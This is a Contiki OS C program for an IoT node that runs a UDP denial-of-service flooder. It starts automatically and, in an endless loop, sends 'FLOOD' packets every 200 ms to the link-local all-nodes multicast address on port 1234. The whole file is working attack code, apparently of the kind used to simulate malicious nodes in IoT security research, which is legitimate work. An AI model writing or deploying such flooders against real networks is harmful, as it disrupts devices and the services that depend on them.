#include "contiki.h"
#include "net/ip/uip.h"
#include "net/ip/uip-udp-packet.h"
#include <stdio.h>

#define UDP_PORT 1234

PROCESS(dos_flood_process, "DoS UDP Flood Process");
AUTOSTART_PROCESSES(&dos_flood_process);

static struct uip_udp_conn *udp_conn;

PROCESS_THREAD(dos_flood_process, ev, data)
{
  static struct etimer timer;
  static uip_ipaddr_t dest_ipaddr;

  PROCESS_BEGIN();

  // Destination: all nodes multicast address
  uip_create_linklocal_allnodes_mcast(&dest_ipaddr);
  udp_conn = udp_new(&dest_ipaddr, UIP_HTONS(UDP_PORT), NULL);

  etimer_set(&timer, CLOCK_SECOND / 5); // Every 200ms

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    uip_udp_packet_send(udp_conn, "FLOOD", 5);
    printf("DoS UDP Flooder: sent flood packet\n");
    etimer_reset(&timer);
  }

  PROCESS_END();
}
